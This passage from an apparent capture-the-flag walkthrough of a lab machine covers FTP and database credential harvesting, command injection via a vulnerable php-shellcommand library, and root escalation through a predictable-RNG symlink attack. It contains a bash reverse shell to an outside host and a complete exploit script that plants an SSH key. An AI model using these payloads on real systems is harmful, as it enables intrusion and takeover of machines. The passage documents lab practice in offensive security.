                $command->addArg($row['email'], $escape=true);

                $msg = file_get_contents($full_path);
                $command->setStdIn('test');
                $command->execute();
            }
        }
        unlink($full_path);
    }
}

cleanup();
?>

```

It does this by reading files out of `$msg_dir` (which must be defined in one of the includes, which I can’t access), and then looping over all users in the DB table `users` and sending them an email. It feels like it should include the body of the file, but I don’t see the `$msg` variable used after it is populated.

Regardless, for the inner loop to run, there needs to be an email in the users table and content in a file.

This app is also using [Composer](https://getcomposer.org/), “a dependency manager for PHP”. The `composer.json` file shows a single dependency:

```

hank@crossfit:/home/isaac/send_updates$ cat composer.json 
{
    "require": {
        "mikehaertl/php-shellcommand": "1.6.0"
    }
}

```

Googling for “mikehaertl/php-shellcommand exploit” shows command injection vulnerabilities:

![image-20210317075247669](https://0xdfimages.gitlab.io/img/image-20210317075247669.png)

The links show that the vulnerability is patched in version 1.6.1, which means this version is vulnerable.

The issue is laid out in this [GitHub issue](https://github.com/mikehaertl/php-shellcommand/issues/44). I’ll come back to this, but I’m still missing another piece.

#### FTP

In `/srv`, there’s an FTP directory that I can’t access:

```

hank@crossfit:/srv$ ls -l
total 4
drwxr-x--- 3 root ftp 4096 May  5  2020 ftp

```

Looking for the FTP config, there’s `/etc/vsftpd.conf` (`<--` comments added by me):

```

listen=YES
anonymous_enable=NO
dirmessage_enable=YES
listen_port=21
connect_from_port_20=YES
pasv_enable=YES
pasv_min_port=60000
pasv_max_port=65000
pasv_addr_resolve=YES
local_enable=YES
local_umask=022
max_login_fails=3
max_per_ip=4
write_enable=YES
pam_service_name=vsftpd          <-- pam authentication
user_config_dir=/etc/vsftpd/user_conf <-- user configuration
ftpd_banner=Cross Fit Ltd. FTP Server
chown_uploads=YES
chown_username=www-data
chroot_local_user=YES
secure_chroot_dir=/var/run/vsftpd
#user_sub_token=$USER
#local_root=/home/vsftpd/$USER
local_root=/var/www              <-- matches previous guess
virtual_use_local_privs=YES
guest_enable=YES
guest_username=vsftpd
nopriv_user=vsftpd
log_ftp_protocol=YES
vsftpd_log_file=/var/log/vsftpd.log
dual_log_enable=YES
xferlog_enable=YES
xferlog_std_format=YES
rsa_cert_file=/etc/ssl/private/vsftpd-selfsigned.pem
ssl_enable=YES
allow_anon_ssl=NO
force_local_data_ssl=YES
force_local_logins_ssl=YES
ssl_tlsv1=YES
ssl_sslv2=NO
ssl_sslv3=NO
require_ssl_reuse=NO
ssl_ciphers=HIGH

```

`/etc/vsftpd/user_conf/` has one file in it, `ftpadm`:

```

hank@crossfit:/etc$ cat vsftpd/user_conf/ftpadm 
local_root=/srv/ftp
guest_username=ftpadm

```

The FTP is serving the directory that I can’t access.

The `/etc/pam.d/vsftpd` file defines how logins happen:

```

hank@crossfit:/etc$ cat pam.d/vsftpd
auth sufficient pam_mysql.so user=ftpadm passwd=8W)}gpRJvAmnb host=localhost db=ftphosting table=accounts usercolumn=username passwdcolumn=pass crypt=3
account sufficient pam_mysql.so user=ftpadm passwd=8W)}gpRJvAmnb host=localhost db=ftphosting table=accounts usercolumn=username passwdcolumn=pass crypt=3

# Standard behaviour for ftpd(8).
auth    required        pam_listfile.so item=user sense=deny file=/etc/ftpusers onerr=succeed

# Note: vsftpd handles anonymous logins on its own. Do not enable pam_ftp.so.

# Standard pam includes
@include common-account
@include common-session
@include common-auth
auth    required        pam_shells.so

```

There’s a username and password for ftpadm, “8W)}gpRJvAmnb”.

These creds work, and get access to a new folder:

```

root@kali# lftp -u ftpadm ftp.crossfit.htb
Password: 
lftp ftpadm@ftp.crossfit.htb:~> set ssl:verify-certificate false
lftp ftpadm@ftp.crossfit.htb:~> ls
drwxrwx---    2 1003     116          4096 Sep 21 10:19 messages

```

The `messages` directory is empty, but seems likely to be the directory associated with the script.

#### users in DB

To exploit the command injection, I need to put a command injection string into the email field. I could try to do that through the website. That’s handled in by `jointheclub.php`, here:

```

<?php
    require("db.php");                    
if(!empty($_POST['email']))
{
    $email = $_POST['email'];
    if(filter_var($email, FILTER_VALIDATE_EMAIL))
    {                                  
        if(strlen($email) > 320)
        {                              
            echo "<p><h4 class='text text-warning'>Email address is too long.</h4></p>";
        }
        else
        {
            if($conn)
            {
                $sql = "SELECT * FROM users WHERE email=?";
                $stmt = $conn->prepare($sql);
                $stmt->bind_param("s", $email);
                $stmt->execute();
                $result = $stmt->get_result();               
                $nrows = mysqli_num_rows($result);
                if(!$result)           
                {
                    echo "<p><h4 class='text text-warning'>Database error.</h4></p>";
                }
                else if(mysqli_num_rows($result) > 0)
                {
                    echo "<p><h4 class='text text-warning'>Email address already registered.</h4></p>";
                }
                else
                {         
                    $sql2 = "INSERT INTO users (email) VALUES (?)";
                    $stmt2 = $conn->prepare($sql2);
                    $stmt2->bind_param("s", $email);
                    if($stmt2->execute())
                    {
                        echo "<p><h4 class='text text-warning'>Thank you for subscribing!</h4></p>";
                    }
                    else
                    {
                        echo "<p><h4 class='text text-warning'>Unexpected error.</h4></p>";
                    }
                }

            }
        }
    }

```

The challenge is that to make it into the DB, it has to pass this line:

```

if(filter_var($email, FILTER_VALIDATE_EMAIL))

```

[This filter](https://www.w3schools.com/php/filter_validate_email.asp) will check for non-email characters, which I need to inject. Luckily, I can just write to the DB. `db.php` has the connection info:

```

<?php
$dbhost = "localhost";
$dbuser = "crossfit";
$dbpass = "oeLoo~y2baeni";
$db = "crossfit";
$conn = new mysqli($dbhost, $dbuser, $dbpass, $db);
?>

```

Those creds allow me to connect:

```

hank@crossfit:/var/www/gym-club$ mysql -u crossfit -poeLoo~y2baeni crossfit
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 3032
Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [crossfit]>

```

The `users` table is empty:

```

MariaDB [crossfit]> select * from users;
Empty set (0.000 sec)

```

If I go to `http://gym-club.crossfit.htb/jointheclub.php` and sign up, my email is now in the table:

```

MariaDB [crossfit]> select * from users;
+----+-------------------+
| id | email             |
+----+-------------------+
| 52 | 0xdf@crossfit.htb |
+----+-------------------+
1 row in set (0.001 sec)

```

So if I want to add a command injection into the database, I can do it from `mysql`:

```

MariaDB [crossfit]> insert into users(email) values('--wrong || touch /dev/shm/0xdf'); 
Query OK, 1 row affected (0.002 sec)

```

And it’s there:

```

MariaDB [crossfit]> select * from users;                                              
+----+--------------------------------+
| id | email                          |
+----+--------------------------------+
| 52 | 0xdf@crossfit.htb              |
| 79 | --wrong || touch /dev/shm/0xdf |
+----+--------------------------------+
2 rows in set (0.000 sec)

```

### Execution POC

As a proof of concept, I’ll try to just write a file. I wasted a lot of time and learned some lessions:
- `/tmp` is not writable, so testing with `touch /tmp/anything` will fail even if the exploit works;
- The `cleanup()` function in PHP must be removing any malicious emails from the DB on each run;
- That cleanup happens regardless of if the mail send (and thus execution) was triggered or not;
- `lftp` seems to show a file even after it’s been deleted sometimes.

I got comfortable testing with three consoles. Two were shells on Crossfit, and one logged into FTP as ftpadm. The first shell is in the DB. The second is running a watch command to track status / success.

```

www-data@crossfit:/dev/shm$ watch 'date; mysql -u crossfit -poeLoo~y2baeni crossfit -e "select * from users"; ls'

```

This will print out the time (so I can watch for the cron), the current `users` table (so I can see what’s pending), and the contents of `/dev/shm`, and update every two seconds. It starts looking like this:

```

Every 2.0s: date; mysql -u crossfit -poeL...  crossfit: Tue Jan 26 17:19:49 2021

Tue Jan 26 17:19:49 EST 2021
id      email
52      0xdf@crossfit.htb

```

Next, I’ll upload a file to `messages` over FTP (any file):

```

lftp ftpadm@ftp.crossfit.htb:/messages> put test.txt
35 bytes transferred    

```

And add the injection:

```

MariaDB [crossfit]> insert into users(email) values('--wrong || touch /dev/shm/0xdf');
Query OK, 1 row affected (0.001 sec)

```

The `watch` updates showing the new user added:

```

Every 2.0s: date; mysql -u crossfit -poeL...  crossfit: Tue Jan 26 17:21:33 2021

Tue Jan 26 17:21:33 EST 2021
id      email
52      0xdf@crossfit.htb
81      --wrong || touch /dev/shm/0xdf

```

When the minute rolls around, the `watch` updates and the injection email is gone:

```

Every 2.0s: date; mysql -u crossfit -poeL...  crossfit: Tue Jan 26 17:22:16 2021

Tue Jan 26 17:22:16 EST 2021
id      email
52      0xdf@crossfit.htb
0xdf

```

The file `0xdf` showed up in `/dev/shm`. The injection worked.

### Shell

Now I’ll just update the injection to return a reverse shell:

```

MariaDB [crossfit]> insert into users(email) values('--wrong || bash -c "bash -i &> /dev/tcp/10.10.14.11/443 0>&1"');
Query OK, 1 row affected (0.002 sec)

```

Making sure to re-upload a file over FTP, when the cron runs, a shell comes back:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.208.
Ncat: Connection from 10.10.10.208:35360.
bash: cannot set terminal process group (8383): Inappropriate ioctl for device
bash: no job control in this shell
isaac@crossfit:~$ id
uid=1000(isaac) gid=1000(isaac) groups=1000(isaac),50(staff),116(ftp),1005(admins)

```

## Shell as root

### Enumeration

One thing I actually noticed in my first shell was that running `ps auxww` only returned processes for the `www-data` user. The same has been true for each other user so far, including isaac:

```

isaac@crossfit:~/send_updates/includes$ ps auxww
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
isaac     8383  0.0  0.0   2388   756 ?        Ss   17:26   0:00 /bin/sh -c /usr/bin/php /home/isaac/send_updates/send_updates.php
isaac     8385  0.3  0.5  89096 22796 ?        S    17:26   0:00 /usr/bin/php /home/isaac/send_updates/send_updates.php
isaac     8415  0.0  0.0   2388   760 ?        S    17:26   0:00 sh -c /usr/bin/mail -s 'CrossFit Club Newsletter' --wrong || bash -c "bash -i &> /dev/tcp/10.10.14.11/443 0>&1" '1'
isaac     8417  0.0  0.0   6644  3168 ?        S    17:26   0:00 bash -c bash -i &> /dev/tcp/10.10.14.11/443 0>&1 1
isaac     8418  0.0  0.1   7900  4596 ?        S    17:26   0:00 bash -i
isaac     8684  0.0  0.2  16856  8608 ?        S    17:27   0:00 python3 -c import pty;pty.spawn("bash")
isaac     8685  0.0  0.1   8344  5148 pts/3    Ss   17:27   0:00 bash
isaac     8967  0.0  0.0  10632  3108 pts/3    R+   17:29   0:00 ps auxww

```

This happens when `/proc` is mounted using the `hidepid=2` options:

```

isaac@crossfit:~/send_updates/includes$ mount
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime,hidepid=2)
...[snip]...

```

After significant enumeration without finding much to look at, I ran [pspy](https://github.com/DominicBreuker/pspy). I uploaded it over FTP:

```

lftp ftpadm@ftp.crossfit.htb:/messages> put /opt/pspy/pspy64
3078592 bytes transferred  

```

isaac can reach that directory to get it out and move it elsewhere before it gets deleted:

```

isaac@crossfit:/srv/ftp/messages$ mv pspy64 /dev/shm
isaac@crossfit:/srv/ftp/messages$ cd /dev/shm
isaac@crossfit:/dev/shm$ chmod +x pspy64 

```

Running it to look for process events isn’t useful, as it will only turn up stuff run by isaac. The other feature `pspy` can do is to look for file events using the `-f` option. There’s a lot going on. I killed it and started again, this time just looking files in the main directories in the path, `./pspy64 -f -r /usr/bin -r /bin -r /usr/local/bin`. On letting that run for a few minutes, some interesting things jump out running every minute:

```

2021/01/27 16:56:01 FS:                 OPEN | /bin/dash
2021/01/27 16:56:01 FS:               ACCESS | /bin/dash
2021/01/27 16:56:01 FS:                 OPEN | /bin/dbmsg
2021/01/27 16:56:01 FS:                 OPEN | /bin/dash
2021/01/27 16:56:01 FS:               ACCESS | /bin/dash
2021/01/27 16:56:01 FS:               ACCESS | /bin/dbmsg
2021/01/27 16:56:01 FS:               ACCESS | /bin/dbmsg
2021/01/27 16:56:01 CMD: UID=1000 PID=3903   | /bin/sh -c /usr/bin/php /home/isaac/send_updates/send_updates.php 
2021/01/27 16:56:01 CMD: UID=1000 PID=3902   | /bin/sh -c /usr/bin/php /home/isaac/send_updates/send_updates.php 
2021/01/27 16:56:01 FS:                 OPEN | /bin/php7.4
2021/01/27 16:56:01 FS:               ACCESS | /bin/php7.4
2021/01/27 16:56:01 FS:        CLOSE_NOWRITE | /bin/dbmsg
2021/01/27 16:56:01 FS:        CLOSE_NOWRITE | /bin/dash
2021/01/27 16:56:01 FS:        CLOSE_NOWRITE | /bin/php7.4
2021/01/27 16:56:01 FS:        CLOSE_NOWRITE | /bin/dash

```

Something is accessing `dash` shell, and then the binary `/bin/dbmsg`. That’s a non-standard binary. Running it just returns a message:

```

isaac@crossfit:/dev/shm$ dbmsg 
This program must be run as root.

```

I’ll grab a copy of this file.

### dbmsg Analysis

#### General

The file is a 64-bit ELF, and it’s not stripped, so function names may still be in place:

```

root@kali# file dbmsg 
dbmsg: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2f0bc3cfa6ec6a297f58ae75f8802bd1b5ef7162, not stripped

```

Because I’m running as root on my VM, I’ll try to run it here:

```

root@kali# ./dbmsg 
Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2)

```

That’s interesting. I’ll keep that in mind.

#### Reversing

I’ll import the binary into [Ghidra](https://ghidra-sre.org/). The `main` function matches the check of the current user I already observed:

```

void main(void)

{
  __uid_t uid;
  time_t time_seed;
  
  uid = geteuid();
  if (uid != 0) {
    fwrite("This program must be run as root.\n",1,0x22,stderr);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  time_seed = time((time_t *)0x0);
  srand((uint)time_seed);
  process_data();
                    /* WARNING: Subroutine does not return */
  exit(0);
}

```

It is checking that the current user ID is 0 (root), and printing a message and exiting if not.

It then calls `srand`, a function that will [initialize the random number generator](http://www.cplusplus.com/reference/cstdlib/srand/) using the given seed. Then it calls `process_data`.

I always find it useful to go through and rename all the variables in Ghidra. Doing so forces you to understand what each is being used for. The following is my `process_data`:

```

void process_data(void)

{
  int query_ret;
  uint rand_num;
  long row0;
  undefined8 zip_error_str;
  size_t rand_plus_row0_len;
  undefined md5 [48];
  char rand_plus_row0 [48];
  char hash_path [48];
  undefined zip_error_str2 [28];
  uint errorp;
  long zip_src_file;
  FILE *f_hash_path;
  long *row;
  long zip_handle;
  long query_result;
  long mysql;
  
  mysql = mysql_init(0);
  if (mysql == 0) {
    fwrite("mysql_init() failed\n",1,0x14,stderr);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  row0 = mysql_real_connect(mysql,"localhost","crossfit","oeLoo~y2baeni","crossfit",0,0,0);
  if (row0 == 0) {
    exit_with_error(mysql);
  }
  query_ret = mysql_query(mysql,"SELECT * FROM messages");
  if (query_ret != 0) {
    exit_with_error(mysql);
  }
  query_result = mysql_store_result(mysql);
  if (query_result == 0) {
    exit_with_error(mysql);
  }
  zip_handle = zip_open("/var/backups/mariadb/comments.zip",1,&errorp);
  if (zip_handle != 0) {
    while (row = (long *)mysql_fetch_row(query_result), row != (long *)0x0) {
      if ((((*row != 0) && (row[1] != 0)) && (row[2] != 0)) && (row[3] != 0)) {
        row0 = *row;
        rand_num = rand();
        snprintf(rand_plus_row0,0x30,"%d%s",(ulong)rand_num,row0);
        rand_plus_row0_len = strlen(rand_plus_row0);
        md5sum(rand_plus_row0,(int)rand_plus_row0_len,(long)md5);
        snprintf(hash_path,0x30,"%s%s","/var/local/",md5);
        f_hash_path = fopen(hash_path,"w");
        if (f_hash_path != (FILE *)0x0) {
          fputs((char *)row[1],f_hash_path);
          fputc(0x20,f_hash_path);
          fputs((char *)row[3],f_hash_path);
          fputc(0x20,f_hash_path);
          fputs((char *)row[2],f_hash_path);
          fclose(f_hash_path);
          if (zip_handle != 0) {
            printf("Adding file %s\n",hash_path);
            zip_src_file = zip_source_file(zip_handle,hash_path,0);
            if (zip_src_file == 0) {
              zip_error_str = zip_strerror(zip_handle);
              fprintf(stderr,"%s\n",zip_error_str);
            }
            else {
              row0 = zip_file_add(zip_handle,md5,zip_src_file);
              if (row0 < 0) {
                zip_source_free(zip_src_file);
                zip_error_str = zip_strerror(zip_handle);
                fprintf(stderr,"%s\n",zip_error_str);
              }
              else {
                zip_error_str = zip_strerror(zip_handle);
                fprintf(stderr,"%s\n",zip_error_str);
              }
            }
          }
        }
      }
    }
    mysql_free_result(query_result);
    delete_rows(mysql);
    mysql_close(mysql);
    if (zip_handle != 0) {
      zip_close(zip_handle);
    }
    delete_files();
    return;
  }
  zip_error_init_with_code(zip_error_str2,(ulong)errorp,(ulong)errorp);
  zip_error_str = zip_error_strerror(zip_error_str2);
  fprintf(stderr,"%s\n",zip_error_str);
                    /* WARNING: Subroutine does not return */
  exit(-1);
}

```

This code first connects to the database using the creds I’ve seen before, and queries the rows from the `messages` table:

```

  mysql = mysql_init(0);
  if (mysql == 0) {
    fwrite("mysql_init() failed\n",1,0x14,stderr);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  row0 = mysql_real_connect(mysql,"localhost","crossfit","oeLoo~y2baeni","crossfit",0,0,0);
  if (row0 == 0) {
    exit_with_error(mysql);
  }
  query_ret = mysql_query(mysql,"SELECT * FROM messages");
  if (query_ret != 0) {
    exit_with_error(mysql);
  }
  query_result = mysql_store_result(mysql);
  if (query_result == 0) {
    exit_with_error(mysql);
  }

```

It then opens a zip file, `/var/backups/mariadb/comments.zip`. This directory exists on Crossfit, but only root has access.

```

  zip_handle = zip_open("/var/backups/mariadb/comments.zip",1,&errorp);

```

Assuming the file opens correctly, it then loops over the rows from the database query (checking to ensure each column has a non-zero value):

```

if (zip_handle != 0) {
    while (row = (long *)mysql_fetch_row(query_result), row != (long *)0x0) {
      if ((((*row != 0) && (row[1] != 0)) && (row[2] != 0)) && (row[3] != 0)) {

```

The first column in the row is then combined with a random number generated from `rand` to form a string, and that string is MD5 hashed, and used to build a string representing a file path in `/var/local`:

```

        row0 = *row;
        rand_num = rand();
        snprintf(rand_plus_row0,0x30,"%d%s",(ulong)rand_num,row0);
        rand_plus_row0_len = strlen(rand_plus_row0);
        md5sum(rand_plus_row0,(int)rand_plus_row0_len,(long)md5);
        snprintf(hash_path,0x30,"%s%s","/var/local/",md5);

```

That file path is then opened, and rows 1 - 3 are written to it, separated by space (0x20), and then it’s closed:

```

        f_hash_path = fopen(hash_path,"w");
        if (f_hash_path != (FILE *)0x0) {
          fputs((char *)row[1],f_hash_path);
          fputc(0x20,f_hash_path);
          fputs((char *)row[3],f_hash_path);
          fputc(0x20,f_hash_path);
          fputs((char *)row[2],f_hash_path);
          fclose(f_hash_path);

```

The new file is then added to the original zip:

```

          if (zip_handle != 0) {
            printf("Adding file %s\n",hash_path);
            zip_src_file = zip_source_file(zip_handle,hash_path,0);
            if (zip_src_file == 0) {
              zip_error_str = zip_strerror(zip_handle);
              fprintf(stderr,"%s\n",zip_error_str);
            }
            else {
              row0 = zip_file_add(zip_handle,md5,zip_src_file);
              if (row0 < 0) {
                zip_source_free(zip_src_file);
                zip_error_str = zip_strerror(zip_handle);
                fprintf(stderr,"%s\n",zip_error_str);
              }
              else {
                zip_error_str = zip_strerror(zip_handle);
                fprintf(stderr,"%s\n",zip_error_str);
              }

```

Then there’s cleanup, deleting the row from the database and the file in `/var/local`:

```

    mysql_free_result(query_result);
    delete_rows(mysql);
    mysql_close(mysql);
    if (zip_handle != 0) {
      zip_close(zip_handle);
    }
    delete_files();
    return;

```

### Generate Exploit Script

#### Strategy

Because I can control what goes into to database I can write the four columns such that the first points to a file I want to write, and the next three are written to the file (space delimited). The only trick here is that the file written to is not the first column, but the hash of the random number concatenated with the first column. Luckily for me, since the cron runs every minute at 1 second after the minute, I can predict the output, and therefore calculate the filename. I can create a symlink at this expected name such that it points to the real file I want to write. A good file to write three space separated fields to would be `/root/.ssh/authorized_keys`.

#### Get Rand

First I need to get the random number. As far as I know, the only way to get the C random number generator is in C, so I wrote this little bit of code:

```

#include <stdio.h>
#include <time.h>
#include <stdlib.h>

int main() {

    time_t now = time(NULL);
    time_t next = now - (now % 60) + 61;
    printf("[*] Current timestamp:    %d\n", now);
    printf("[*] Next cron will be at: %d\n", next);

    srand(next);
    printf("[+] Randon num at next:   %d\n", rand());

    return 0;
}

```

It will get the current time, and then remove that time mod 60 to get the last minute. Then it adds 61 to get to one second after the next minute, when the cron will next run.

I’ll use that time to seed the RNG, and then get the random number from it. It works as far as I can tell:

```

$ ./time_rand
[*] Current timestamp:    1611873707
[*] Next cron will be at: 1611873721
[+] Randon num at next:   407664450

```

Because I want to run a script on CrossFit, I’ll need to compile this there. I’ll create a Bash script that writes this code, compiles it, runs it, and cleans up:

```

#/bin/bash

cat > /var/tmp/d.c <<'EOF'
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

int main() {

    time_t now = time(NULL);
    time_t next = now - (now % 60) + 61;
    srand(next);
    printf("%d\n", rand());

    return 0;
}
EOF

echo '[*] Writing c code to get "random" int'
gcc -o /var/tmp/d /var/tmp/d.c
randint=$(/var/tmp/d)
echo "[+] Got random int: $randint"
echo "[*] Cleaning up code"
rm /var/tmp/d /var/tmp/d.c

```

#### Generate Symlink

Next I need to create the symlink. I’ll pick an ID kind of randomly (223 works), and then get the hash to create the filename:

```

id=223
fn=$(echo -n "${randint}${id}" | md5sum | cut -d' ' -f1)
echo "[+] Filename will be: /var/local/$fn"
ln -s /root/.ssh/authorized_keys /var/local/$fn
echo "[+] Created symlink to /root/.ssh/authorized_keys"

```

#### Update Database

The next part of the script will update the database with the id 223 and the rest being the parts of my public SSH key:

```

ssh="ssh-ed25519"
key="AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d"
user="nobody@nothing"
echo "[*] Writing to DB: insert into messages(id, name, email, message) values ($id, '$ssh', '$user', '$key')"
mysql -u crossfit -poeLoo~y2baeni crossfit -e "insert into messages(id, name, email, message) values ($id, '$ssh', '$user', '$key')"

```

#### Wait

So I don’t have to keep checking the time, I’ll run a little countdown timer until the next cron runs:

```

secleft=$((60 - $(date +%-S)))
echo "[*] Sleeping $secleft seconds until cron"
nextmin=$((1 + $(date +%-M)))
while [[ $(date +%-M) -ne $nextmin ]]; do
    echo -en "\r[*] $((60 - $(date +%-S))) seconds left"
    sleep 0.5
done
echo -e "\r[*] Try logging in as root with SSH key"

```

### Exploit

I’ll upload the [final script](/files/crossfit-root.sh) to CrossFit and run it:

```

isaac@crossfit:/dev/shm$ ./root.sh
[*] Writing c code to get "random" int
[+] Got random int: 1884167658
[*] Cleaning up code
[+] Filename will be: /var/local/56bd8aef3ca539e098fdb7c135c31544
[+] Created symlink to /root/.ssh/authorized_keys
[*] Writing to DB: insert into messages(id, name, email, message) values (223, 'ssh-ed25519', 'nobody@nothing', 'AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d')
[*] Sleeping 26 seconds until cron
[*] Try logging in as root with SSH key

```

It worked:

```

root@kali# ssh -i ~/keys/ed25519_gen root@10.10.10.208
Linux crossfit 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Sep 21 04:46:55 2020
root@crossfit:~# 

```